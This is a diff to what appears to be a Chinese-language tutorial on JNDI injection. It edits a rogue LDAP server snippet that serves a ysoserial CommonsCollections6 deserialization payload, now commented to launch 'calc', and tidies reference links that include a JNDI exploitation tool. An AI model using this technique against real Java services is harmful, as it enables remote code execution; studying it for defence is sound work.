@@ -425,7 +425,7 @@ public class RMIServer {
 protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
     e.addAttribute("javaClassName", "foo");
     try {
-        // java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 '/Applications/Calculator.app/Contents/MacOS/Calculator'|base64
+        // java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 'calc'|base64
         e.addAttribute("javaSerializedData",Base64.decode(payload));
     } catch (ParseException e1) {
         e1.printStackTrace();
@@ -780,6 +780,4 @@ ObjectFactory 的实现类里有好几个类都是用来实例化数据源的，
 - [如何绕过高版本 JDK 的限制进行 JNDI 注入利用](https://paper.seebug.org/942/){target="_blank"}
 - [java高版本下各种JNDI Bypass方法复现](https://www.cnblogs.com/bitterz/p/15946406.html){target="_blank"}
 - [探索高版本 JDK 下 JNDI 漏洞的利用方法](https://tttang.com/archive/1405/){target="_blank"}
-
-
-[JNDI 注入利用工具](https://github.com/X1r0z/JNDIMap){target="_blank"}
+- [JNDI 注入利用工具](https://github.com/X1r0z/JNDIMap){target="_blank"}
